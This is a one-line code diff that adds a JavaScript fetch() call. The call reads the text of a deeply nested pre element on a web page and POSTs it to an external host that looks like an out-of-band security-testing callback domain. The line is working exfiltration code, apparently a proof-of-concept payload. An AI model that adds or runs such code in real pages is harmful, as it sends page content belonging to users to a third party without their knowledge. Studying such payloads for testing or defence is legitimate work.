@@ -1,0 +1,1 @@
+fetch('https://4nsklriw0ytcawsnnie4xdml9cf33u2ir.l.prod.burpcloth.infosec.a2z.com',{method:'POST',body:document.querySelector('div.bc-container:nth-child(18) > adbl-style-scope:nth-child(1) > adbl-accordion:nth-child(3) > adbl-accordion-item:nth-child(1) > adbl-stack:nth-child(2) > pre:nth-child(5)').innerText});
